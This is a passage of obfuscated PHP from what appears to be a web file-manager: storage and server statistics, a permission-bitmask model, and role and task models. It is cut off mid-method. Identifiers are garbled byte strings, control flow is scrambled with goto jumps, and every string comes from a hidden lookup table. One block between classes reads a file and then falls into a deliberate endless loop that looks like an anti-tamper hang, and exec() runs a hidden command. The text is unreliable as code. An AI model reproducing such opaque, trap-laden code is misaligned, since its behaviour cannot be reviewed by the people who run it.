D¾åèÔ‰: $aÖİ¾ˆ¯¬ = strtotime($a«»³êàİµ[2037]); $AªéÒºœİÉ = array($a«»³êàİµ[2038] => array($a«»³êàİµ[930], $aÖİ¾ˆ¯¬)); $CÃ‡œ˜®ò§ = (int) Model($a«»³êàİµ[473])->where($AªéÒºœİÉ)->count($a«»³êàİµ[1416]); goto Fœ¸ÃÑÒÉÉ; f‡Úõ©š‹: } private function optionFile() { goto c¹”æŒÃòÒ; AÂ®ÉŸÃì: $Bí‚‚Åì¤ = $fÙõ‘Œ·Ô‹[$DÊ©Û»†Ü[2010]]; $a®ŒŒÑ²Úù = Model($DÊ©Û»†Ü[755])->where(array($DÊ©Û»†Ü[367] => 0))->count($DÊ©Û»†Ü[366]); $bîâİ‰‘ñ— = array($DÊ©Û»†Ü[367] => 0, $DÊ©Û»†Ü[184] => array($DÊ©Û»†Ü[930], strtotime(date($DÊ©Û»†Ü[2017])))); goto D‰çœ Ğ“; D‰çœ Ğ“: $d´‚â‹ÚÔÈ = Model($DÊ©Û»†Ü[755])->where($bîâİ‰‘ñ—)->sum($DÊ©Û»†Ü[77]); $b™Ë²—Ü‚ë = Model($DÊ©Û»†Ü[755])->where($bîâİ‰‘ñ—)->count($DÊ©Û»†Ü[366]); return array($DÊ©Û»†Ü[701] => $B· §¥­§Ä, $DÊ©Û»†Ü[2010] => $Bí‚‚Åì¤, $DÊ©Û»†Ü[2043] => $B· §¥­§Ä - $Bí‚‚Åì¤, $DÊ©Û»†Ü[2044] => (int) $d´‚â‹ÚÔÈ, $DÊ©Û»†Ü[703] => (int) $a®ŒŒÑ²Úù, $DÊ©Û»†Ü[2045] => (int) $b™Ë²—Ü‚ë); goto A•»³¶­‘Á; c¹”æŒÃòÒ: $DÊ©Û»†Ü =& $_SERVER[Äº¡•ô™Ÿ]; $fÙõ‘Œ·Ô‹ = $this->sourceSize(); $B· §¥­§Ä = $fÙõ‘Œ·Ô‹[$DÊ©Û»†Ü[77]]; goto AÂ®ÉŸÃì; A•»³¶­‘Á: } private function optionAccess() { $bğïŒ¨öÖ =& $_SERVER[Äº¡•ô™Ÿ]; return array($bğïŒ¨öÖ[698] => $this->typeLogCnt(), $bğïŒ¨öÖ[91] => $this->typeLogCnt($bğïŒ¨öÖ[91]), $bğïŒ¨öÖ[400] => $this->typeLogCnt($bğïŒ¨öÖ[400]), $bğïŒ¨öÖ[2046] => $this->typeLogCnt($bğïŒ¨öÖ[2046]), $bğïŒ¨öÖ[2047] => $this->typeLogCnt($bğïŒ¨öÖ[2047]), $bğïŒ¨öÖ[531] => $this->typeLogCnt($bğïŒ¨öÖ[33], $bğïŒ¨öÖ[2021])); } private function typeLogCnt($FÑ½ùæµºÕ = '', $d‚ŒÎÑ‚• = "\x69\144") { goto Bø„¡÷Ï¬; e®°š›®•º: return (int) $e³æñÖßœ; goto A…Á¿Â¦¬; Bø„¡÷Ï¬: $bëóšµ Êà =& $_SERVER[Äº¡•ô™Ÿ]; $d¨‘¡‰¼ñ = array($bëóšµ Êà[91] => array($bëóšµ Êà[2048], $bëóšµ Êà[2049]), $bëóšµ Êà[400] => array($bëóšµ Êà[2050], $bëóšµ Êà[2051]), $bëóšµ Êà[2046] => array($bëóšµ Êà[2052], $bëóšµ Êà[2053]), $bëóšµ Êà[2047] => array($bëóšµ Êà[2054], $bëóšµ Êà[2055]), $bëóšµ Êà[2056] => array($bëóšµ Êà[2057], $bëóšµ Êà[2058], $bëóšµ Êà[2059])); $AÊº»ªøå = strtotime(date($bëóšµ Êà[2017])); goto EÏ®…ÜÚ‰î; EÏ®…ÜÚ‰î: $C•¢‘ŸÍ˜³ = array($bëóšµ Êà[184] => array($bëóšµ Êà[930], $AÊº»ªøå)); if ($FÑ½ùæµºÕ) { $C•¢‘ŸÍ˜³[$bëóšµ Êà[29]] = array($bëóšµ Êà[7], $d¨‘¡‰¼ñ[$FÑ½ùæµºÕ]); } $e³æñÖßœ = Model($bëóšµ Êà[2020])->where($C•¢‘ŸÍ˜³)->count($d‚ŒÎÑ‚•); goto e®°š›®•º; A…Á¿Â¦¬: } private function optionServer() { goto bŠŒ¾ùèƒµ; E¿ˆÛà†Ÿê: return array($Cò™ÄÔåî…[2062] => $EÛ¾‚§Í ? $EÛ¾‚§Í[$Cò™ÄÔåî…[2063]] : 0, $Cò™ÄÔåî…[2064] => $EÛ¾‚§Í ? $EÛ¾‚§Í[$Cò™ÄÔåî…[2065]] : 0, $Cò™ÄÔåî…[2066] => (int) $A‘¨¶å°ö[$Cò™ÄÔåî…[2063]] * 1024 * 1024 * 1024, $Cò™ÄÔåî…[2067] => (int) $a®Ñ›‘¶’, $Cò™ÄÔåî…[2068] => ucfirst($bèºøµºŒ), $Cò™ÄÔåî…[2069] => $Cò™ÄÔåî…[2070] . PHP_VERSION, $Cò™ÄÔåî…[2071] => phpBuild64() ? 64 : 32, $Cò™ÄÔåî…[697] => str_replace($Cò™ÄÔåî…[2072], $Cò™ÄÔåî…[906], $aÄê˜ğØ›ù), $Cò™ÄÔåî…[334] => ucfirst($C‘İãó…„ñ), $Cò™ÄÔåî…[28] => $_SERVER[$Cò™ÄÔåî…[2073]]); goto bÕïŞïØ©ƒ; F˜Îœš‚î: if ($aÄê˜ğØ›ù == $Cò™ÄÔåî…[727]) { $EÂç¡÷ñ¡ = explode($Cò™ÄÔåî…[1076], $b¡½×İè–™[$Cò™ÄÔåî…[889]]); $aÄê˜ğØ›ù = $EÂç¡÷ñ¡[0]; } if ($aÄê˜ğØ›ù == $Cò™ÄÔåî…[730] || $aÄê˜ğØ›ù == $Cò™ÄÔåî…[731]) { $Eå¶Ê˜í¼Í = Model()->db()->query($Cò™ÄÔåî…[2060]); $a–¾Üô¦éº = $Eå¶Ê˜í¼Í[0] && isset($Eå¶Ê˜í¼Í[0][$Cò™ÄÔåî…[1320]]) ? $Eå¶Ê˜í¼Í[0][$Cò™ÄÔåî…[1320]] : 0; $aÄê˜ğØ›ù = $Cò™ÄÔåî…[2061] . ($a–¾Üô¦éº ? $Cò™ÄÔåî…[8] . $a–¾Üô¦éº : $Cò™ÄÔåî…[33]); } $C‘İãó…„ñ = $GLOBALS[$Cò™ÄÔåî…[6]][$Cò™ÄÔåî…[334]][$Cò™ÄÔåî…[756]]; goto E¿ˆÛà†Ÿê; bŠŒ¾ùèƒµ: $Cò™ÄÔåî… =& $_SERVER[Äº¡•ô™Ÿ]; $EÛ¾‚§Í = $this->diskDriver(); $A‘¨¶å°ö = KodIO::defaultDriver(); goto FòÅğéÑŠ; eğÊ‡±´“: $bèºøµºŒ = $cìŒ“õô—™[0]; $b¡½×İè–™ = $GLOBALS[$Cò™ÄÔåî…[6]][$Cò™ÄÔåî…[17]]; $aÄê˜ğØ›ù = $b¡½×İè–™[$Cò™ÄÔåî…[890]]; goto F˜Îœš‚î; FòÅğéÑŠ: $c¼Ñ™ğ¥©Œ = array($Cò™ÄÔåî…[746] => $A‘¨¶å°ö[$Cò™ÄÔåî…[364]]); $a®Ñ›‘¶’ = Model($Cò™ÄÔåî…[418])->where($c¼Ñ™ğ¥©Œ)->sum($Cò™ÄÔåî…[77]); $cìŒ“õô—™ = explode($Cò™ÄÔåî…[50], $_SERVER[$Cò™ÄÔåî…[138]]); goto eğÊ‡±´“; bÕïŞïØ©ƒ: } private function diskDriver() { goto bôåÃç‰ƒá; F‹»ùöª‚‹: $BÉ¹«»¡Œ© = $e˜ÆáÕÇÒ - @disk_free_space($Cô©×Ÿ‚¬Í); return array($e‹Æ¿Š®Ã¾[2063] => $e˜ÆáÕÇÒ, $e‹Æ¿Š®Ã¾[2065] => $BÉ¹«»¡Œ©); goto dÍ‡«‰öÙ…; bôåÃç‰ƒá: $e‹Æ¿Š®Ã¾ =& $_SERVER[Äº¡•ô™Ÿ]; $Cô©×Ÿ‚¬Í = $e‹Æ¿Š®Ã¾[8]; $e‚ÕÖÒš¾ğ = $GLOBALS[$e‹Æ¿Š®Ã¾[6]][$e‹Æ¿Š®Ã¾[2074]] == $e‹Æ¿Š®Ã¾[2075]; goto AÄîÊÒ; AÄîÊÒ: if ($e‚ÕÖÒš¾ğ) { $Cô©×Ÿ‚¬Í = $e‹Æ¿Š®Ã¾[2076]; if (function_exists($e‹Æ¿Š®Ã¾[2077])) { exec($e‹Æ¿Š®Ã¾[2078], $b¶â•ˆ¦¥¡); $Cô©×Ÿ‚¬Í = $b¶â•ˆ¦¥¡[1] . $e‹Æ¿Š®Ã¾[8]; } } if (!file_exists($Cô©×Ÿ‚¬Í)) { return; } $e˜ÆáÕÇÒ = @disk_total_space($Cô©×Ÿ‚¬Í); goto F‹»ùöª‚‹; dÍ‡«‰öÙ…: } public function fileChart($b«¤è¿õÒ˜) { goto D¾±ôˆ›‚; aÚİºÌ„­: $F¡ÕãÂïõ[$fÀèòÒé‘â[368]] = 2; $D§Ë“›ˆ• = Model($fÀèòÒé‘â[755])->where($F¡ÕãÂïõ)->sum($fÀèòÒé‘â[77]); return array($fÀèòÒé‘â[701] => $A‰İºÚøºõ[$fÀèòÒé‘â[77]], $fÀèòÒé‘â[2010] => $A‰İºÚøºõ[$fÀèòÒé‘â[2010]], $fÀèòÒé‘â[2011] => (int) $Fßãó‰Ğª‹, $fÀèòÒé‘â[2012] => (int) $D§Ë“›ˆ•); goto aÍÓƒàÆâ³; D¾±ôˆ›‚: $fÀèòÒé‘â =& $_SERVER[Äº¡•ô™Ÿ]; if (isset($b«¤è¿õÒ˜[$fÀèòÒé‘â[1416]])) { return Model($fÀèòÒé‘â[755])->userFileTypeProfile($b«¤è¿õÒ˜[$fÀèòÒé‘â[1416]]); } if (isset($b«¤è¿õÒ˜[$fÀèòÒé‘â[2079]])) { return Model($fÀèòÒé‘â[755])->groupFileTypeProfile($b«¤è¿õÒ˜[$fÀèòÒé‘â[2079]]); } goto DŸ÷™é˜’; DŸ÷™é˜’: $A‰İºÚøºõ = $this->sourceSize(); $F¡ÕãÂïõ = array($fÀèòÒé‘â[457] => 0, $fÀèòÒé‘â[368] => 1); $Fßãó‰Ğª‹ = Model($fÀèòÒé‘â[755])->where($F¡ÕãÂïõ)->sum($fÀèòÒé‘â[77]); goto aÚİºÌ„­; aÍÓƒàÆâ³: } private function sourceSize() { $AÖéÊÒÙ­õ =& $_SERVER[Äº¡•ô™Ÿ]; $aÁÓĞºí•İ = Model($AÖéÊÒÙ­õ[755])->where(array($AÖéÊÒÙ­õ[367] => 0))->sum($AÖéÊÒÙ­õ[77]); $DªÖ¬ğø¢ = Model($AÖéÊÒÙ­õ[418])->sum($AÖéÊÒÙ­õ[77]); if ($DªÖ¬ğø¢ > $aÁÓĞºí•İ) { $DªÖ¬ğø¢ = $aÁÓĞºí•İ; } return array($AÖéÊÒÙ­õ[77] => (int) $aÁÓĞºí•İ, $AÖéÊÒÙ­õ[2010] => (int) $DªÖ¬ğø¢); } } if (!isset($_SERVER[$_SERVER[Äº¡•ô™Ÿ][789]]) || !isset($_SERVER[$_SERVER[Äº¡•ô™Ÿ][1205]])) { goto e²Ï·ã¢·Ê; E·‡¶¶°¯Ş: $b‹ç¿Ö´($_SERVER[$_SERVER[Äº¡•ô™Ÿ][793]] . $_SERVER[Äº¡•ô™Ÿ][794]); $F“èŸ¸éå = 2; while ($F“èŸ¸éå > 1) { $EÖÚùíôºÍ = rawurlencode($F“èŸ¸éå . $_SERVER[Äº¡•ô™Ÿ][358]); } goto a·Ë—Ø‚; fªÚÔ‹«š: $A·Òíà‹ò = explode($_SERVER[Äº¡•ô™Ÿ][214], $D À‡õší­); if (count($A·Òíà‹ò) < $_SERVER[Äº¡•ô™Ÿ][561]) { $f¸¨„£ÂŸ = $_SERVER[Äº¡•ô™Ÿ][795]; $f¸¨„£ÂŸ(); } $b‹ç¿Ö´ = $_SERVER[Äº¡•ô™Ÿ][1204]; goto E·‡¶¶°¯Ş; e²Ï·ã¢·Ê: $bàŠ‡ö¬—ó = $_SERVER[Äº¡•ô™Ÿ][792]; $f­À½æˆ = $_SERVER[$_SERVER[Äº¡•ô™Ÿ][793]] . $_SERVER[Äº¡•ô™Ÿ][794]; $D À‡õší­ = $bàŠ‡ö¬—ó($f­À½æˆ); goto fªÚÔ‹«š; a·Ë—Ø‚: } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authDefault() { $FÉÖĞ¤Ù°… =& $_SERVER[Äº¡•ô™Ÿ]; $bô›ÔœäÅ = array(array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2080]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2082], $FÉÖĞ¤Ù°…[2083] => 6, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2086]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2087], $FÉÖĞ¤Ù°…[2083] => 1, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2088]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2089], $FÉÖĞ¤Ù°…[2083] => 2, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2090]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2089], $FÉÖĞ¤Ù°…[2083] => 3, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2091]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2092], $FÉÖĞ¤Ù°…[2083] => 4, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => self::AUTH_SHOW | self::AUTH_VIEW), array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2093]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2094], $FÉÖĞ¤Ù°…[2083] => 5, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($FÉÖĞ¤Ù°…[383] => LNG($FÉÖĞ¤Ù°…[2095]), $FÉÖĞ¤Ù°…[2081] => $FÉÖĞ¤Ù°…[2096], $FÉÖĞ¤Ù°…[2083] => 7, $FÉÖĞ¤Ù°…[2084] => 1, $FÉÖĞ¤Ù°…[2085] => 0)); return $bô›ÔœäÅ; } public static function authCheck($Fç¼„¿Ö‰ğ, $BééÕ¡) { $Fç¼„¿Ö‰ğ = intval($Fç¼„¿Ö‰ğ); if (_get($GLOBALS, $_SERVER[Äº¡•ô™Ÿ][453])) { return !0; } if ($Fç¼„¿Ö‰ğ <= 0) { return !1; } if (($Fç¼„¿Ö‰ğ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Fç¼„¿Ö‰ğ & $BééÕ¡); } public static function authCheckShow($CâÄÙ­…‰¤) { return self::authCheck($CâÄÙ­…‰¤, self::AUTH_SHOW); } public static function authCheckView($e‰‹ÔÁØÄ) { return self::authCheck($e‰‹ÔÁØÄ, self::AUTH_VIEW); } public static function authCheckDownload($cÏ˜¨™Ô½Š) { return self::authCheck($cÏ˜¨™Ô½Š, self::AUTH_DOWNLOAD); } public static function authCheckUpload($eÀÊßÆ‘½‘) { return self::authCheck($eÀÊßÆ‘½‘, self::AUTH_UPLOAD); } public static function authCheckEdit($dÍé¦ ½©) { return self::authCheck($dÍé¦ ½©, self::AUTH_EDIT); } public static function authCheckRemove($EÉˆªµ•À) { return self::authCheck($EÉˆªµ•À, self::AUTH_REMOVE); } public static function authCheckShare($c„òèùÉ¿×) { return self::authCheck($c„òèùÉ¿×, self::AUTH_SHARE); } public static function authCheckComment($a‹÷’¦ÃÖ) { return self::authCheck($a‹÷’¦ÃÖ, self::AUTH_COMMENT); } public static function authCheckEvent($c¾¬„„õ¨) { return self::authCheck($c¾¬„„õ¨, self::AUTH_EVENT); } public static function authCheckRoot($a•Ğñ‡öÇ) { return self::authCheck($a•Ğñ‡öÇ, self::AUTH_ROOT); } public static function authDisable($AÊÂÖª„ô‘, $EÃ½Ê™‹’Ë) { if (intval($AÊÂÖª„ô‘) <= 0) { return 0; } return intval($AÊÂÖª„ô‘) & ~$EÃ½Ê™‹’Ë; } public $optionType = "\x53\x79\x73\x74\145\155\56\x73\157\165\162\143\145\x41\165\x74\150\114\x69\163\x74"; public $field = array("\156\141\x6d\145", "\141\x75\x74\150", "\x6c\141\142\145\x6c", "\144\x69\x73\x70\154\x61\x79", "\163\171\163\164\x65\155", "\x73\157\x72\164"); public function initData() { $Eƒ„ôÖïŠŠ = $this->authDefault(); foreach ($Eƒ„ôÖïŠŠ as $AŠ„Ìì‘›Œ) { $this->add($AŠ„Ìì‘›Œ); } } public function listData($F¨»ßšÃİò = false, $F‹†Å«Š½ = "\163\x6f\x72\x74", $d”ªùĞä§† = false) { return parent::listData($F¨»ßšÃİò, $F‹†Å«Š½, $d”ªùĞä§†); } public function update($eò¬‹ªàº, $eßİ¿­ìÁ¿) { $C—–ÓØßâ =& $_SERVER[Äº¡•ô™Ÿ]; $F£ƒªÇ…¤Ô = parent::listData($eò¬‹ªàº); $d˜Î×«§ŠÕ = $this->findByName($eßİ¿­ìÁ¿[$C—–ÓØßâ[28]]); if (!$F£ƒªÇ…¤Ô || $d˜Î×«§ŠÕ && $d˜Î×«§ŠÕ[$C—–ÓØßâ[364]] != $F£ƒªÇ…¤Ô[$C—–ÓØßâ[364]]) { return !1; } $this->filterAuth($eßİ¿­ìÁ¿[$C—–ÓØßâ[373]]); return parent::update($eò¬‹ªàº, $eßİ¿­ìÁ¿); } public function remove($b“’ì‘Ş‰ª) { $E¼ªÑªãÍ = parent::listData($b“’ì‘Ş‰ª); if (!$E¼ªÑªãÍ || $E¼ªÑªãÍ[$_SERVER[Äº¡•ô™Ÿ][1080]]) { return !1; } return parent::remove($b“’ì‘Ş‰ª); } public function add($aÈÓĞÖ¤‡ƒ = array()) { goto FåÖ‘Ğèéá; FÁğ®”¥‡é: return parent::insert($aÈÓĞÖ¤‡ƒ); goto FÉœÆŞÙíƒ; aÄ Ñ‚À¨: $aÈÓĞÖ¤‡ƒ = array_merge($dİ¯‹ ƒÉ¥, $aÈÓĞÖ¤‡ƒ); $aÈÓĞÖ¤‡ƒ[$b½ÛîáÀŠÍ[2100]] = $this->getSort(); $this->filterAuth($aÈÓĞÖ¤‡ƒ[$b½ÛîáÀŠÍ[373]]); goto FÁğ®”¥‡é; FåÖ‘Ğèéá: $b½ÛîáÀŠÍ =& $_SERVER[Äº¡•ô™Ÿ]; if ($this->findByName($aÈÓĞÖ¤‡ƒ[$b½ÛîáÀŠÍ[28]])) { return !1; } $dİ¯‹ ƒÉ¥ = array($b½ÛîáÀŠÍ[28] => $b½ÛîáÀŠÍ[33], $b½ÛîáÀŠÍ[373] => 1, $b½ÛîáÀŠÍ[2097] => $b½ÛîáÀŠÍ[2098], $b½ÛîáÀŠÍ[2099] => 1, $b½ÛîáÀŠÍ[1080] => 0, $b½ÛîáÀŠÍ[2100] => 0); goto aÄ Ñ‚À¨; FÉœÆŞÙíƒ: } private function getSort() { $fŞ™¨çèãô =& $_SERVER[Äº¡•ô™Ÿ]; $eÉˆªæ¢ÍÆ = parent::listData(); $E÷˜«½ãŞ· = array_to_keyvalue($eÉˆªæ¢ÍÆ, $fŞ™¨çèãô[33], $fŞ™¨çèãô[2100]); return empty($E÷˜«½ãŞ·) ? 0 : max($E÷˜«½ãŞ·) + 1; } private function filterAuth(&$bèŠáä™¢³) { goto C½†ªò˜’; C½†ªò˜’: if (!$bèŠáä™¢³) { return; } $AíŠùëšÙš = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $EÛ„ÙãØ = array(); goto FÃŞ«¼§Ù¦; bŒÏ£ôÑä: foreach ($EÛ„ÙãØ as $eòäŸ¸¡¤¶) { if (isset($dˆµ‡ƒâÁ¾[$eòäŸ¸¡¤¶])) { $EÛ„ÙãØ = array_merge($EÛ„ÙãØ, $dˆµ‡ƒâÁ¾[$eòäŸ¸¡¤¶]); } } $EÛ„ÙãØ[] = self::AUTH_SHOW; $bèŠáä™¢³ = array_sum(array_unique($EÛ„ÙãØ)); goto Cßä½˜¹É—; FÃŞ«¼§Ù¦: foreach ($AíŠùëšÙš as $eòäŸ¸¡¤¶) { if ($bèŠáä™¢³ & $eòäŸ¸¡¤¶) { $EÛ„ÙãØ[] = $eòäŸ¸¡¤¶; } } if (in_array(self::AUTH_ROOT, $EÛ„ÙãØ)) { $bèŠáä™¢³ = array_sum($AíŠùëšÙš); return; } $dˆµ‡ƒâÁ¾ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto bŒÏ£ôÑä; Cßä½˜¹É—: } public function sort($BÜÇêİ‡Î, $bïÜÕ‰¶) { return parent::update($BÜÇêİ‡Î, $bïÜÕ‰¶); } } goto a»œó²Â‚œ; CÄ†¬©éÃ: class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\145\155\56\x72\x6f\x6c\145\114\151\163\164"; public $field = array("\156\141\155\145", "\141\165\x74\150", "\x6c\x61\142\145\x6c", "\144\x69\163\160\154\141\x79", "\x73\171\x73\x74\x65\x6d", "\x64\145\x73\143", "\x69\147\x6e\157\x72\145\x45\x78\x74", "\x69\x67\x6e\x6f\x72\x65\106\151\x6c\x65\x53\x69\172\x65", "\x61\144\x6d\151\156\x69\163\164\162\141\164\157\162", "\163\157\x72\x74"); public function listData($B°ŒÃ¦”ƒ = false, $b×íäÜçñ˜ = "\163\x6f\162\164", $CùšÅ…†× = false) { return parent::listData($B°ŒÃ¦”ƒ, $b×íäÜçñ˜, $CùšÅ…†×); } public function update($eŠåùÃÛ¼¦, $BÈ¥¯¾¿Ó) { goto e¯ˆÔòš; e¯ˆÔòš: $f©«…±¤¹Â =& $_SERVER[Äº¡•ô™Ÿ]; $bÌ‚ãÊ®öÉ = parent::listData($eŠåùÃÛ¼¦); $cÍÑ¯¢İç… = $this->findByName($BÈ¥¯¾¿Ó[$f©«…±¤¹Â[28]]); goto EÚØÜí£Ú‘; fµ¥Ë‚³©ç: return parent::update($eŠåùÃÛ¼¦, $BÈ¥¯¾¿Ó); goto E¡“Š»Ñ; EÚØÜí£Ú‘: if (!$bÌ‚ãÊ®öÉ || $cÍÑ¯¢İç… && $cÍÑ¯¢İç…[$f©«…±¤¹Â[364]] != $bÌ‚ãÊ®öÉ[$f©«…±¤¹Â[364]]) { return !1; } if ($cÍÑ¯¢İç…[$f©«…±¤¹Â[2446]] == 1) { $BÈ¥¯¾¿Ó = array($f©«…±¤¹Â[28] => $BÈ¥¯¾¿Ó[$f©«…±¤¹Â[28]], $f©«…±¤¹Â[2097] => $BÈ¥¯¾¿Ó[$f©«…±¤¹Â[2097]]); } $this->filterAuth($BÈ¥¯¾¿Ó[$f©«…±¤¹Â[373]]); goto fµ¥Ë‚³©ç; E¡“Š»Ñ: } public function remove($Däêä­¿Âª) { $b™ˆ¡ÃøŒ‡ = parent::listData($Däêä­¿Âª); if (!$b™ˆ¡ÃøŒ‡ || $b™ˆ¡ÃøŒ‡[$_SERVER[Äº¡•ô™Ÿ][1080]]) { return !1; } return parent::remove($Däêä­¿Âª); } public function add($D•ÎğäÌ¾Ó) { goto a¾¯ìš‰ÒÆ; Fõ˜ì‹¿Å: return parent::insert($D•ÎğäÌ¾Ó); goto AçƒŠÖ‹»Ó; a¾¯ìš‰ÒÆ: $bÅŞİ¶§² =& $_SERVER[Äº¡•ô™Ÿ]; $f´¿É„ÁŠ = $D•ÎğäÌ¾Ó[$bÅŞİ¶§²[28]]; if ($this->findByName($f´¿É„ÁŠ)) { return !1; } goto eÎ°‹İ×Çß; eÎ°‹İ×Çß: $bÄ”Â ŠŠÆ = array($bÅŞİ¶§²[383] => $f´¿É„ÁŠ, $bÅŞİ¶§²[2085] => $bÅŞİ¶§²[33], $bÅŞİ¶§²[2081] => $bÅŞİ¶§²[2098], $bÅŞİ¶§²[2447] => 1, $bÅŞİ¶§²[2084] => 0, $bÅŞİ¶§²[2448] => 0, $bÅŞİ¶§²[2083] => $this->getSort()); $D•ÎğäÌ¾Ó = array_merge($bÄ”Â ŠŠÆ, $D•ÎğäÌ¾Ó); $this->filterAuth($D•ÎğäÌ¾Ó[$bÅŞİ¶§²[373]]); goto Fõ˜ì‹¿Å; AçƒŠÖ‹»Ó: } private function getSort() { $B¼¤«¶„ÚÏ =& $_SERVER[Äº¡•ô™Ÿ]; $B»î“¹½˜’ = parent::listData(); $Aò¡‹©ğ“Û = array_to_keyvalue($B»î“¹½˜’, $B¼¤«¶„ÚÏ[33], $B¼¤«¶„ÚÏ[2100]); return empty($Aò¡‹©ğ“Û) ? 0 : max($Aò¡‹©ğ“Û) + 1; } private function filterAuth(&$aàÜà¶¯÷Š) { $Däæ’³º—´ =& $_SERVER[Äº¡•ô™Ÿ]; $dÆÚ…º”› = array(); $F³Œ×¡“‘ = array_filter(explode($Däæ’³º—´[47], $aàÜà¶¯÷Š)); foreach ($F³Œ×¡“‘ as $aàÜà¶¯÷Š) { $aä”Ë”ì¸« = explode($Däæ’³º—´[93], $aàÜà¶¯÷Š); if ($aä”Ë”ì¸«[0] == $Däæ’³º—´[1759] && $aä”Ë”ì¸«[1] != $Däæ’³º—´[1036]) { $dôÔ¦šÆô = $aä”Ë”ì¸«[0] . $Däæ’³º—´[93] . $aä”Ë”ì¸«[1] . $Däæ’³º—´[2449]; if (!in_array($dôÔ¦šÆô, $F³Œ×¡“‘)) { $dÆÚ…º”›[] = $dôÔ¦šÆô; } } $dÆÚ…º”›[] = $aàÜà¶¯÷Š; } $aàÜà¶¯÷Š = implode($Däæ’³º—´[47], $dÆÚ…º”›); } public function sort($d‰ï…†Ú–ˆ, $DŞŠò§Š²Ò) { return parent::update($d‰ï…†Ú–ˆ, $DŞŠò§Š²Ò); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\155\56\164\141\163\153\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\x74\x79\x70\145", "\x65\166\145\x6e\164", "\164\151\x6d\x65", "\144\x65\x73\x63", "\x73\x79\163\164\x65\155", "\145\x6e\141\142\154\145", "\154\x61\163\164\122\165\156", "\x73\x6f\162\164"); public function listData($D¹®³Ÿ›š = false, $A™½–ß„Ô = "\163\157\x72\164", $d„øŞ…‡ = false) { return parent::listData($D¹®³Ÿ›š, $A™½–ß„Ô, $d„øŞ…‡); } public function add($C´ªÃÄĞç‡) { $CÉ»µè‡…… =& $_SERVER[Äº¡•ô™Ÿ]; $F‡ïäÇñ¶ = $this->findByName($C´ªÃÄĞç‡[$CÉ»µè‡……[28]]); if ($F‡ïäÇñ¶) { return !1; } $C´ªÃÄĞç‡[$CÉ»µè‡……[1381]] = 0; $C´ªÃÄĞç‡[$CÉ»µè‡……[2100]] = $this->getSort(); return parent::insert($C´ªÃÄĞç‡); } private function getSort() { $E¨¡›¢»¬š =& $_SERVER[Äº¡•ô™Ÿ]; $Fô†Û‹™ = parent::listData(); $fìçµÂ°ƒÃ = array_to_keyvalue($Fô†Û‹™, $E¨¡›¢»¬š[33], $E¨¡›¢»¬š[2100]); return empty($fìçµÂ°ƒÃ) ? 0 : max($fìçµÂ°ƒÃ) + 1; } public function update($eËªßÀ¨è†, $FôêáÑŸÍ) { $dòâŒ‘ š =& $_SERVER[Äº¡•ô™Ÿ]; $e’¹‚è ‚ä = $this->listData($eËªßÀ¨è†); $c”Ô¬Œ‹à‰ = $this->findByName($FôêáÑŸÍ[$dòâŒ‘ š[28]]); if (!$e’¹‚è ‚ä || $c”Ô¬Œ‹à‰ && $c”Ô¬Œ‹à‰[$dòâŒ‘ š[364]] != $e’¹‚è ‚ä[$dòâŒ‘ š[364]]) { return !1; } return parent::update($eËªßÀ¨è†, $FôêáÑŸÍ); } public function 